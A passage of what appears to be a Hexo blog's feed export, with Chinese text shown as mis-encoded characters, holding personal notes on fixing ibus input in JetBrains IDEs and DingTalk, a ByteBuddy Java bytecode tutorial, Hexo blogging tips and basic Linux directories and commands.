<h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><h3 id="jetbrainå…¨å®¶æ¡¶"><a href="#jetbrainå…¨å®¶æ¡¶" class="headerlink" title="jetbrainå…¨å®¶æ¡¶"></a>jetbrainå…¨å®¶æ¡¶</h3><p> ä¿®æ”¹å¯¹åº”å¯åŠ¨æ–‡ä»¶æ¯”å¦‚ idea.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export XMODIFIERS=&quot;@im=ibus&quot;</span><br><span class="line">export GTK_IM_MODULE=&quot;ibus&quot;</span><br><span class="line">export QT_IM_MODULE=&quot;ibus&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>ç‚¹å‡»ideaæˆ–è€…pycharmèœå• â€œHelp | Edit Custom VM optionsâ€¦â€</li>
<li>æ·»åŠ  -Drecreate.x11.input.method=true åˆ°æœ€åä¸€è¡Œ</li>
<li>é‡å¯IDEA</li>
</ul>
<h3 id="é’‰é’‰for-linux"><a href="#é’‰é’‰for-linux" class="headerlink" title="é’‰é’‰for linux"></a>é’‰é’‰for linux</h3><p><code>/opt/apps/com.alibabainc.dingtalk/files/Elevator.sh</code></p>
<p>ä¿®æ”¹fcitxä¸ºibus</p>
<p>å’ŒåŸè§£å†³æ–¹æ¡ˆçš„ä½œè€…è·¯å¾„ä¸å¤ªä¸€æ ·ï¼Œåº”è¯¥æ˜¯é’‰é’‰æ›´æ–°ä¹‹åä¿®æ”¹äº†ï¼Œæ€è·¯å…¶å®éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://github.com/libpinyin/ibus-libpinyin/issues/289">https://github.com/libpinyin/ibus-libpinyin/issues/289</a></p>
<p><a href="https://blog.csdn.net/weixin_43276139/article/details/120492441">https://blog.csdn.net/weixin_43276139/article/details/120492441</a></p>
]]></content>
      <tags>
        <tag>æ‚</tag>
      </tags>
  </entry>
  <entry>
    <title>java ByteBuddy</title>
    <url>/2021/11/24/java-ByteBuddy/</url>
    <content><![CDATA[<p>æŠ˜è…¾äº†å¥½ä¹…çš„javaagentä¸çŸ¥ä¸ºä½•å°±æ˜¯ä¸èƒ½åœ¨loadç±»çš„æ—¶å€™è¿›è¡Œå…¶ä»–ç±»çš„æ‰§è¡Œï¼Œå…ˆæ”¾ä¸€æ”¾ï¼Œäº†è§£ä¸€ä¸‹ByteBuddyçš„ä½¿ç”¨</p>
<blockquote>
<p>Byte Buddy æ˜¯ä¸€ä¸ªä»£ç ç”Ÿæˆå’Œæ“ä½œåº“ï¼Œç”¨äºåœ¨Javaåº”ç”¨ç¨‹åºè¿è¡Œæ—¶åˆ›å»ºå’Œä¿®æ”¹Javaç±»ï¼Œè€Œæ— éœ€ç¼–è¯‘å™¨çš„å¸®åŠ©ã€‚é™¤äº†Javaç±»åº“é™„å¸¦çš„ä»£ç ç”Ÿæˆå®ç”¨ç¨‹åºå¤–ï¼ŒByte Buddyè¿˜å…è®¸åˆ›å»ºä»»æ„ç±»ï¼Œå¹¶ä¸”ä¸é™äºå®ç°ç”¨äºåˆ›å»ºè¿è¡Œæ—¶ä»£ç†çš„æ¥å£ã€‚æ­¤å¤–ï¼ŒByte Buddyæä¾›äº†ä¸€ç§æ–¹ä¾¿çš„APIï¼Œå¯ä»¥ä½¿ç”¨Javaä»£ç†æˆ–åœ¨æ„å»ºè¿‡ç¨‹ä¸­æ‰‹åŠ¨æ›´æ”¹ç±»ã€‚</p>
</blockquote>
<p>æ¯”èµ·javassist,asm,bcelèµ·æ¥éƒ½æ¯”è¾ƒç®€å•</p>
<p>ä¸ªäººç†è§£å°±æ˜¯ä¸ºäº†è§£å†³Javaé™æ€è¯­è¨€çš„ä¸æ–¹ä¾¿ä¹‹å¤„ï¼Œé€šè¿‡ç›´æ¥ç”Ÿæˆå­—èŠ‚ç ç„¶åä½¿ç”¨JVMè¿è¡Œï¼Œå’Œåå°„æœºåˆ¶æœ‰ç‚¹åƒï¼Œä½†æ˜¯æ¯”åå°„æœºåˆ¶æ•ˆç‡æ›´é«˜ï¼Œå› ä¸ºæ˜¯ç”Ÿæˆå­—èŠ‚ç ç›´æ¥è·‘javaè™šæ‹Ÿæœºã€‚</p>
<span id="more"></span>

<p>é¦–å…ˆå®‰è£…</p>
<p>mavençš„é¡¹ç›®åœ¨pom.xmlé‡Œé¢æ·»åŠ ä¸€ä¸ªä¾èµ–</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.bytebuddy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>byte-buddy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>çœ‹çœ‹ç”¨æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.iast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.ByteBuddy;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.FixedValue;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.matcher.ElementMatchers;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * MyAgent</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAgent</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        Class&lt;?&gt; dynamicType = <span class="keyword">new</span> ByteBuddy().subclass(Object.class).method(ElementMatchers.named(<span class="string">&quot;toString&quot;</span>))</span><br><span class="line">                .intercept(FixedValue.value(<span class="string">&quot;Hello World&quot;</span>)).make().load(MyAgent.class.getClassLoader()).getLoaded();</span><br><span class="line"></span><br><span class="line">        Object instance = dynamicType.newInstance();</span><br><span class="line">        String toString = instance.toString();</span><br><span class="line">        System.out.println(toString);</span><br><span class="line">        System.out.println(instance.getClass().getCanonicalName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637745053102-2021-11-2417:10:53.png"></p>
<p>å®ŒæˆåŠ¨æ€æ„é€ ä¸€ä¸ªç±»å¹¶ä¸”è¾“å‡ºä»–çš„</p>
<ul>
<li>subclassæŒ‡å®šäº†æ–°åˆ›å»ºç±»çš„çˆ¶ç±»</li>
<li>methodæŒ‡å®šäº†Objectçš„å¤„ç†æ–¹æ³•</li>
<li>interceptæ‹¦æˆªäº†toStringæ–¹æ³•å¹¶è¿”å›æŒ‡å®šçš„helllo world</li>
<li>æœ€åmakeäº§ç”Ÿå­—èŠ‚ç ï¼Œç”±ç±»åŠ è½½å™¨åŠ è½½åˆ°è™šæ‹Ÿæœºä¸­</li>
</ul>
<h3 id="åˆ›å»ºç±»"><a href="#åˆ›å»ºç±»" class="headerlink" title="åˆ›å»ºç±»"></a>åˆ›å»ºç±»</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DynamicType.Unloaded&lt;?&gt; dynamicType = <span class="keyword">new</span> ByteBuddy()</span><br><span class="line">  .subclass(Object.class)</span><br><span class="line">  .make();</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ªç±»ï¼Œè¿˜å¯ä»¥åœ¨makeç”Ÿæˆå­—èŠ‚ç ä¹‹å‰<code>.name(&quot;your_name&quot;)</code>æ¥è¿›è¡Œå‘½å</p>
<h3 id="åŠ è½½ç±»"><a href="#åŠ è½½ç±»" class="headerlink" title="åŠ è½½ç±»"></a>åŠ è½½ç±»</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; type = <span class="keyword">new</span> ByteBuddy()</span><br><span class="line">  .subclass(Object.class)</span><br><span class="line">  .make()</span><br><span class="line">  .load(getClass().getClassLoader(), ClassLoadingStrategy.Default.WRAPPER)</span><br><span class="line">  .getLoaded();</span><br></pre></td></tr></table></figure>

<h3 id="redefineå’Œrebase"><a href="#redefineå’Œrebase" class="headerlink" title="redefineå’Œrebase"></a>redefineå’Œrebase</h3><p>redefineä¿®æ”¹ä¹‹åå°±ä¼šæŠŠåŸæ¥çš„ç±»åŠŸèƒ½å†²æ‰ï¼Œå˜å¾—ä¸å¯ç”¨</p>
<p>rebaseåªæ˜¯åŠ äº†ä¸ªå‰ç¼€è€Œå·²</p>
<h3 id="é‡è½½ç±»"><a href="#é‡è½½ç±»" class="headerlink" title="é‡è½½ç±»"></a>é‡è½½ç±»</h3><p>ç›¸å½“äºæ˜¯å’Œjavaagentä¸€æ ·çš„åŠŸèƒ½ï¼Œåœ¨ç±»loadçš„æ—¶å€™åŠ«æŒå¹¶ä¸”è¿è¡Œæˆ‘ä»¬è‡ªå·±çš„ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">  <span class="function">String <span class="title">m</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;foo&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> </span>&#123;</span><br><span class="line">  <span class="function">String <span class="title">m</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;bar&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ByteBuddyAgent.install();</span><br><span class="line">Foo foo = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="keyword">new</span> ByteBuddy()</span><br><span class="line">  .redefine(Bar.class)</span><br><span class="line">  .name(Foo.class.getName())</span><br><span class="line">  .make()</span><br><span class="line">  .load(Foo.class.getClassLoader(), ClassReloadingStrategy.fromInstalledAgent());</span><br><span class="line">assertThat(foo.m(), is(<span class="string">&quot;bar&quot;</span>));    </span><br></pre></td></tr></table></figure>



<h3 id="æ–¹æ³•æ‹¦æˆª"><a href="#æ–¹æ³•æ‹¦æˆª" class="headerlink" title="æ–¹æ³•æ‹¦æˆª"></a>æ–¹æ³•æ‹¦æˆª</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Foo dynamicFoo = <span class="keyword">new</span> ByteBuddy()</span><br><span class="line">  .subclass(Foo.class)</span><br><span class="line">  <span class="comment">// åŒ¹é…ç”±Foo.classå£°æ˜çš„æ–¹æ³•</span></span><br><span class="line">  .method(isDeclaredBy(Foo.class)).intercept(FixedValue.value(<span class="string">&quot;One!&quot;</span>))</span><br><span class="line">  <span class="comment">// åŒ¹é…åä¸ºfooçš„æ–¹æ³•</span></span><br><span class="line">  .method(named(<span class="string">&quot;foo&quot;</span>)).intercept(FixedValue.value(<span class="string">&quot;Two!&quot;</span>))</span><br><span class="line">  <span class="comment">// åŒ¹é…åä¸ºfooï¼Œå…¥å‚æ•°é‡ä¸º1çš„æ–¹æ³•</span></span><br><span class="line">  .method(named(<span class="string">&quot;foo&quot;</span>).and(takesArguments(<span class="number">1</span>))).intercept(FixedValue.value(<span class="string">&quot;Three!&quot;</span>))</span><br><span class="line">  .make()</span><br><span class="line">  .load(getClass().getClassLoader())</span><br><span class="line">  .getLoaded()</span><br><span class="line">  .newInstance();</span><br></pre></td></tr></table></figure>



<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://bytebuddy.net/#/tutorial">https://bytebuddy.net/#/tutorial</a></p>
]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoå†™ä½œ</title>
    <url>/2021/11/05/hexo%E5%86%99%E4%BD%9C/</url>
    <content><![CDATA[<p>æ¢äº†ä¸ªä¸»é¢˜è¿˜æ˜¯ç”¨äº†next,è¿˜è¡Œå§ï¼Œå…ˆç”¨ç€</p>
<p><strong>tips:</strong></p>
<pre><code> 1.  é¦–å…ˆ`&lt;!-- more --&gt;`å¯ä»¥ç”¨æ¥åœ¨ä¸»é¡µéšè—å‰©ä¸‹ç¯‡å¹…ï¼Œå±•ç¤º&quot;read more&quot;
</code></pre>
<h2 id="hexoåˆ›å»ºæ–‡ç« "><a href="#hexoåˆ›å»ºæ–‡ç« " class="headerlink" title="hexoåˆ›å»ºæ–‡ç« "></a>hexoåˆ›å»ºæ–‡ç« </h2><p>ç„¶åè®°å½•ä¸€ä¸‹hexoå†™blogçš„æ–¹å¼:</p>
<ol>
<li><p>åˆ›å»ºæ–°æ–‡ç« </p>
<p><code>hexo new aritle &#39;your_aritle_name&#39; </code> ç„¶åå°±æ˜¯ç”¨mdæ ¼å¼å†™blog</p>
</li>
<li><p>åˆ›å»ºæ–°é¡µé¢</p>
<p><code>hexo new page your_page_name</code></p>
<p>ç„¶åå¯ä»¥å»<code>$(blog_root)/themes/next/_config.yml</code> menuä¸‹é¢å¼€å¯(æ–°å¢)è¿™ä¸ªæ–°å»ºçš„é¡µé¢ï¼Œæœ¬è´¨ä¾æ—§æ˜¯markdownæ–‡æ¡£</p>
</li>
<li><p>categories &amp; tags</p>
<p>åŒºåˆ«categorieså¯ä»¥åµŒå¥—ä½¿ç”¨ï¼Œtagsæ˜¯å¹³çº§çš„å­˜åœ¨</p>
<ul>
<li>fooçš„ä¸‹çº§ç›®å½•æ˜¯bar</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">foo</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">bar</span></span><br></pre></td></tr></table></figure>

<ul>
<li>foo,baræ˜¯å¹³çº§çš„tag</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">foo</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">bar</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="ä½¿ç”¨è¯„è®ºç³»ç»Ÿ-Disqus"><a href="#ä½¿ç”¨è¯„è®ºç³»ç»Ÿ-Disqus" class="headerlink" title="ä½¿ç”¨è¯„è®ºç³»ç»Ÿ Disqus"></a>ä½¿ç”¨è¯„è®ºç³»ç»Ÿ Disqus</h2><p><a href="https://guanqr.com/tech/website/hexo-theme-next-comments/">å‚è€ƒæ–‡ç« </a></p>
<ol>
<li>æ³¨å†Œdisqus,è¿™é‡Œæˆ‘é€‰çš„æ˜¯ç›´æ¥ç”¨googleå¸å·ç™»å½•</li>
<li>è·å–åˆ°shortnameä¹‹åå¡«å…¥<code>$(blog_root)/themes/next/_config.yml</code><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636100640951-2021-11-516:24:00.png"></li>
<li>ç„¶åé‡æ–°éƒ¨ç½²ä¸‹å°±è¡Œ</li>
</ol>
<p><strong>éœ€è¦æ³¨æ„çš„æ˜¯æ¯”å¦‚é¡µé¢ä¸å¸Œæœ›å‡ºç°è¯„è®ºå¯ä»¥åœ¨font-matterä¸­</strong><code>comments: false</code></p>
]]></content>
      <categories>
        <category>æŠ˜è…¾hexo</category>
      </categories>
  </entry>
  <entry>
    <title>Linuxæ“ä½œç¬”è®°</title>
    <url>/2021/11/06/linux/</url>
    <content><![CDATA[<h1 id="Linuxï¼ˆcentos6ï¼‰"><a href="#Linuxï¼ˆcentos6ï¼‰" class="headerlink" title="Linuxï¼ˆcentos6ï¼‰"></a>Linuxï¼ˆcentos6ï¼‰</h1><p>1Bytes = 8 bits    ä¸€ä¸ªå­—èŠ‚ç­‰äº å…«ä½</p>
<p>1KB = 1024Bytes</p>
<p>â€¦</p>
<p>clearæ¸…å± æˆ–è€…ctrl+l</p>
<ul>
<li>linuxçš„æ‰€æœ‰å­˜å‚¨è®¾å¤‡éƒ½å¿…é¡»æŒ‚è½½ä¹‹åä½¿ç”¨ï¼ŒåŒ…æ‹¬uç›˜å…‰ç›˜</li>
</ul>
<table>
<thead>
<tr>
<th>ç›®å½•å</th>
<th>ç›®å½•ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>/bin/</td>
<td>å­˜æ”¾ç³»ç»Ÿå‘½ä»¤ï¼Œæ™®é€šç”¨æˆ·å’Œè¶…çº§ç”¨æˆ·éƒ½å¯ä»¥æ‰§è¡Œï¼Œ</td>
</tr>
<tr>
<td>/sbin/</td>
<td>ä¿å­˜å’Œç³»ç»Ÿè®¾ç½®ç›¸å…³çš„å‘½ä»¤ï¼Œåªæœ‰è¶…çº§ç”¨æˆ·å¯ä»¥ä½¿ç”¨è¿™äº›å‘½ä»¤è¿›è¡Œç³»ç»Ÿç¯å¢ƒè®¾ç½®ï¼Œä½†æ˜¯å‘½ä»¤æ™®é€šç”¨æˆ·å¯ä»¥æŸ¥çœ‹</td>
</tr>
<tr>
<td>/usr/sbin/</td>
<td>å­˜æ”¾ç³»ç»Ÿå‘½ä»¤çš„ç›®å½•ï¼Œæ™®é€šç”¨æˆ·å’Œè¶…çº§ç”¨æˆ·éƒ½å¯ä»¥æ‰§è¡Œï¼Œè¿™äº›å‘½ä»¤ä¸ç³»ç»Ÿå¯åŠ¨æ— å…³ï¼Œå•ç”¨æˆ·æ¨¡å¼ä¸‹ä¸èƒ½æ‰§è¡Œ</td>
</tr>
<tr>
<td>/boot/</td>
<td>ç³»ç»Ÿå¯åŠ¨ç›®å½•ï¼Œä¿å­˜ç³»ç»Ÿå¯åŠ¨ç›¸å…³æ–‡ä»¶</td>
</tr>
<tr>
<td>/dev/</td>
<td>è®¾å¤‡æ–‡ä»¶çš„ä¿å­˜ä½ç½®ï¼ŒLinuxä¸­ç”¨æ¥ä¿å­˜æ‰€æœ‰çš„ç¡¬ä»¶è®¾å¤‡æ–‡ä»¶/</td>
</tr>
<tr>
<td>/etc/</td>
<td>é…ç½®æ–‡ä»¶çš„ä¿å­˜ä½ç½®ã€‚ç³»ç»Ÿå†…é‡‡ç”¨rpmå®‰è£…çš„æœåŠ¡é…ç½®æ–‡ä»¶éƒ½åœ¨æ­¤ç›®å½•ä¸­</td>
</tr>
<tr>
<td>/home/</td>
<td>æ™®é€šç”¨æˆ·çš„å®¶ç›®å½•</td>
</tr>
<tr>
<td>/lib/</td>
<td>ç³»ç»Ÿè°ƒç”¨å‡½æ•°åº“çš„ä¿å­˜ä½ç½®</td>
</tr>
<tr>
<td>/lost+found/</td>
<td>ç³»ç»Ÿæ„å¤–å´©æºƒè€Œäº§ç”Ÿçš„æ–‡ä»¶ç¢ç‰‡ï¼Œæ¯ä¸ªåˆ†åŒºéƒ½æœ‰è‡ªå·±çš„lost+found</td>
</tr>
<tr>
<td>/media/</td>
<td>æŒ‚è½½ç›®å½•ï¼Œåª’ä½“æ–‡ä»¶</td>
</tr>
<tr>
<td>/mnt/</td>
<td>æŒ‚è½½ç›®å½•ï¼Œuç›˜ï¼Œç§»åŠ¨ç¡¬ç›˜</td>
</tr>
<tr>
<td>/misc/</td>
<td>æŒ‚è½½ç›®å½•ï¼Œç³»ç»Ÿå»ºè®®nfsæœåŠ¡çš„å…±äº«ç›®å½•</td>
</tr>
<tr>
<td>/opt/</td>
<td>ç¬¬ä¸‰æ–¹å®‰è£…çš„è½¯ä»¶ä¿å­˜ä½ç½®ï¼Œä¸€èˆ¬æŠŠç¬¬ä¸‰æ–¹è½¯ä»¶åœ¨/usr/local/ç›®å½•ä¸­</td>
</tr>
<tr>
<td>/proc/</td>
<td>è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œè¯¥ç›®å½•çš„æ•°æ®ä¿å­˜åˆ°å†…å­˜ä¸­ï¼Œä¸»è¦ä¿å­˜ç³»ç»Ÿçš„å†…æ ¸ã€è¿›ç¨‹ã€å¤–éƒ¨çŠ¶æ€ã€ç½‘ç»œçŠ¶æ€ç¯</td>
</tr>
<tr>
<td>/sys/</td>
<td>å’Œprocç›¸ä¼¼ï¼Œä¸»è¦ä¿å­˜ä¸€äº›å†…æ ¸ç›¸å…³çš„ä¿¡æ¯</td>
</tr>
<tr>
<td>/root/</td>
<td>è¶…çº§ç®¡ç†å‘˜çš„å®¶ç›®å½•</td>
</tr>
<tr>
<td>/srv/</td>
<td>æœåŠ¡æ•°æ®ç›®å½•</td>
</tr>
<tr>
<td>/tmp/</td>
<td>ä¸´æ—¶æ•°æ®ç›®å½•</td>
</tr>
<tr>
<td>/usr/</td>
<td>unix software resource ç³»ç»Ÿèµ„æºç›®å½•ï¼Œç”¨äºå­˜æ”¾ç³»ç»Ÿçš„è½¯ä»¶èµ„æºï¼Œä¸æ˜¯user</td>
</tr>
<tr>
<td>/var/</td>
<td>åŠ¨æ€æ•°æ®ä¿å­˜ä½ç½®ã€‚æ—¥å¿—ï¼Œä¿å­˜ç¼“å­˜ç­‰</td>
</tr>
</tbody></table>
<ul>
<li>é‡å¯æ—¶åº”è¯¥å…³é—­æœåŠ¡</li>
<li>æœåŠ¡å™¨è®¿é—®é«˜å³°ä¸è¦è¿è¡Œé«˜è´Ÿè½½å‘½ä»¤ï¼ˆå¤§å®¹é‡çš„å¤åˆ¶è§£å‹ï¼‰</li>
<li>è¿œç¨‹é…ç½®é˜²ç«å¢™ä¸è¦æŠŠè‡ªå·±è¸¢å‡ºæœåŠ¡å™¨</li>
<li>å¯†ç è¦å®šæœŸæ›´æ–°</li>
<li>åˆ†é…åˆç†æƒé™</li>
<li>å®šæœŸå¤‡ä»½é‡è¦æ•°æ®å’Œæ—¥å¿—</li>
</ul>
<span id="more"></span>

<h2 id="Linuxå¸¸ç”¨å‘½ä»¤"><a href="#Linuxå¸¸ç”¨å‘½ä»¤" class="headerlink" title="Linuxå¸¸ç”¨å‘½ä»¤"></a>Linuxå¸¸ç”¨å‘½ä»¤</h2><h3 id="æ–‡ä»¶å¤„ç†å‘½ä»¤"><a href="#æ–‡ä»¶å¤„ç†å‘½ä»¤" class="headerlink" title="æ–‡ä»¶å¤„ç†å‘½ä»¤"></a>æ–‡ä»¶å¤„ç†å‘½ä»¤</h3><ul>
<li><p>ç›®å½•å¤„ç†å‘½ä»¤ï¼šls ï¼ŒåŸæ„listï¼›è·¯å¾„åœ¨/bin/ls</p>
<p>å‚æ•° -a åŸæ„all æ‰€æœ‰æ–‡ä»¶æ˜¾ç¤º</p>
<p>â€‹    -l åŸæ„long ï¼Œæ˜¾ç¤ºå‡ºè¯¦ç»†ä¿¡æ¯     </p>
<p>â€‹    -h åŸæ„human ï¼Œæ˜¾ç¤ºå•ä½kbã€mbï¼›</p>
<p>â€‹    -d åŸæ„directï¼Œåªæ˜¾ç¤ºç›®å½•ï¼Œè€Œä¸å±•å¼€ç›®å½•æ‰€æœ‰æ–‡ä»¶</p>
<p>â€‹    -i åŸæ„ä¸ºinodeï¼Œidå·</p>
<p>æ–‡ä»¶æŠŠç”¨æˆ·åˆ†æˆä¸‰ç»„ï¼š</p>
<p>ï¼ˆ-äºŒè¿›åˆ¶æ–‡ä»¶ dç›®å½•direct  lè½¯é“¾æ¥æ–‡ä»¶linkï¼‰</p>
<p>æ‰€æœ‰è€…useræ‰€å±ç»„ groupå…¶ä»– other</p>
<p>rè¯» wå†™ xæ‰§è¡Œ</p>
</li>
<li><p>ç›®å½•å¤„ç†å‘½ä»¤ï¼šmkdir</p>
<p>make directories è·¯å¾„/bin/mkdir</p>
<p>-p é€’å½’åˆ›å»ºï¼Œæ¯”å¦‚ï¼šmkdir -p /tmp/test</p>
</li>
<li><p>ç›®å½•å¤„ç†å‘½ä»¤ ï¼š cd</p>
<p>change directory</p>
<p>cd .. è¿”å›ä¸Šä¸€çº§ç›®å½•</p>
</li>
<li><p>pwd ï¼Œprint working directory</p>
</li>
<li><p>rmdir, remove empty directories ,åªèƒ½åˆ é™¤ç©ºç›®å½•</p>
</li>
<li><p>å¤åˆ¶å‘½ä»¤cp </p>
<p> -r å¤åˆ¶ç›®å½•</p>
<p> -p ä¿ç•™æ–‡ä»¶å±æ€§ï¼ˆä¿®æ”¹æ—¶é—´ç­‰ï¼‰</p>
<p>cp -r [ä¸€ä¸ªæ–‡ä»¶ä½ç½®] [å¦ä¸€ä¸ªæ–‡ä»¶ä½ç½®]</p>
</li>
<li><p>ç£ç›˜æ‹·è´å‘½ä»¤dd</p>
<p>   if = è¾“å…¥æ–‡ä»¶</p>
<p>   of =è¾“å‡ºæ–‡ä»¶</p>
<p>   bs = å­—èŠ‚æ•°</p>
<p>   count = ä¸ªæ•° </p>
<ul>
<li><p>mv å‰ªåˆ‡å’Œæ‹·è´</p>
<p>move ã€‚æ”¹å<code>mv æºæ–‡ä»¶å æ–°æ–‡ä»¶å</code></p>
<p>ç§»åŠ¨æ“ä½œ<code>mv è·¯å¾„ å¦ä¸€ä¸ªè·¯å¾„</code></p>
</li>
<li><p>rmåˆ é™¤æ–‡ä»¶å‘½ä»¤</p>
<p>remove </p>
<p>åˆ é™¤æ–‡ä»¶ rmæ–‡ä»¶å</p>
<p>åˆ é™¤ç›®å½• rm -r ç›®å½•å</p>
<p>åˆ é™¤ç›®å½•ä¸éœ€è¦ç¡®è®¤ -f</p>
</li>
<li><p>touch åˆ›å»ºæ–‡ä»¶</p>
<p>touchä¸­é—´å¸¦ç©ºæ ¼æ˜¯æŒ‡åˆ›å»ºå¤šä¸ªæ–‡ä»¶</p>
<p>touch program filesä¼šåˆ›å»ºä¸¤ä¸ª   è€Œ  touchâ€œprogram filesâ€æ‰ä¼šåˆ›å»ºå¸¦ç©ºæ ¼çš„æ–‡ä»¶</p>
</li>
<li><p>catå¯ä»¥æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹</p>
<p>â€‹    -n æ˜¾ç¤ºè¡Œå·</p>
<p>â€‹    æŠŠcatåè¿‡æ¥å†™tacï¼Œä¼šå€’ç€æ˜¾ç¤º</p>
</li>
<li><p>moreå¯ä»¥åˆ†é¡µæ˜¾ç¤º</p>
<p>â€‹    æŒ‰fï¼Œspaceè¿›è¡Œç¿»é¡µ</p>
<p>â€‹    enterä¸€è¡Œä¸€è¡Œç¿»é¡µ</p>
<p>â€‹    qé€€å‡ºmoreæ¨¡å¼</p>
</li>
<li><p>lessæ˜¾ç¤ºç¿»é¡µæ˜¾ç¤ºï¼Œå¯ä»¥å¾€ä¸Šç¿»pgupï¼Œå‘ä¸Šä¸€è¡Œå¯ä»¥æŒ‰ä¸Šç®­å¤´</p>
<p>â€‹    â€œ/å…³é”®è¯ â€        å›è½¦ å¯ä»¥ç”¨äºæœç´¢ï¼ŒæŒ‰né”®å¯ä»¥æŸ¥æ‰¾ä¸‹ä¸€ä¸ªå…³é”®è¯</p>
<p>â€‹    å…¶ä½™æ“ä½œä¸moreç›¸åŒ</p>
</li>
<li><p>æŒ‡å®šæŸ¥çœ‹å‰å‡ è¡Œ   head -n  7æ–‡ä»¶è·¯å¾„</p>
<p>â€‹    è¡¨ç¤ºå‰7è¡Œ</p>
<p>â€‹    ä¸å†™7é»˜è®¤æ˜¾ç¤ºå‰10è¡Œ</p>
</li>
<li><p>æŒ‡å®šæŸ¥çœ‹åå‡ è¡Œ   tail </p>
<p>â€‹    -n æŒ‡å®šè¡Œæ•°</p>
<p>â€‹    -f  åŠ¨æ€æ˜¾ç¤ºæ–‡ä»¶æœ«å°¾å†…å®¹ </p>
</li>
<li><p>lnç”Ÿæˆé“¾æ¥æ–‡ä»¶ï¼ˆè½¯é“¾æ¥ç±»æ¯”ä¸winå¿«æ·æ–¹å¼ï¼Œæ–‡ä»¶æƒé™lrwxrwxrwxï¼Œlè¡¨ç¤ºlinkè½¯è¿æ¥ï¼‰</p>
<p>â€‹    -s æºæ–‡ä»¶ ç›®æ ‡æ–‡ä»¶  ï¼ˆæ„ä¸ºç”Ÿæˆè½¯é“¾æ¥ï¼‰soft</p>
<p>â€‹    ä¸åŠ -sä¸ºç¡¬é“¾æ¥ ï¼Œç¡¬é“¾æ¥ç›¸å½“äºæ‹·è´+åŒæ­¥æ›´æ–° </p>
<p>ç¡¬é“¾æ¥å¯ä»¥ç”¨ièŠ‚ç‚¹ è¯†åˆ«å³ls -i ï¼Œæœ‰ç›¸åŒidå·ï¼ˆå†…æ ¸é€šè¿‡è°ƒç”¨idå·å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œç¡¬é“¾æ¥ä¹‹é—´æœ‰ç›¸åŒçš„idå·ï¼Œå®ç°åŒæ­¥æ›´æ–°ï¼‰</p>
<p>ç¡¬é“¾æ¥ä¸å¯ä»¥è·¨åŒºåˆ†åŒºï¼ˆè½¯è¿æ¥å¯ä»¥ï¼‰</p>
